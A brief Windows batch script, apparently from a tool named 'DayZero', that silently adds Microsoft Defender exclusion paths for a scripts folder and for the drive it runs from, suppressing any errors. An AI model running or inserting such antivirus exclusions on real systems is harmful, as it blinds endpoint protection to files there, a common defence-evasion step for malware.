@echo off
rem DayZero: keep Defender off the runtime script folder and the stick
for %%P in ("%SystemDrive%\DayZero\Scripts" "%~dp0") do (
    powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%%~P'" 2>nul
)
exit /b 0